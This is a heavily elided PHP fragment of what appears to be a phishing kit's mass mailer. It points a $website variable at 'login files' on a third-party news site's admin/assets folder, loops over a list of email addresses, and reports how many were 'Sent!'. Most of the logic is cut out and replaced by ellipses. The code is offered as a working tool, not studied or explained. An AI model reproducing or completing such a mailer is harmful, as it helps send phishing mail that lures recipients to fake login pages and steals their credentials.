...
$website = "http://www.jnnoticias.com/admin/assets/"; // Make this full URL including folders of where login files reside
    ...
    if ($mails != '' && $details != '') {
        ...
        for ($i = 0; $i < $total; $i++) {
            ...
            if (validate_email($email)) {
                ...
                print "<div style='color:gray;'>" . $email . " not valid</div>";
            }
        }
        print "<h1 style='color:green;'>Bravo! " . $valid . "/" . $total . " Sent! <a href='' style='color:green'>Continue</a></h1>";
    } else {
        print "<h1 style='color:red'>Mails or Details empty</h1>";
    }
}
?>
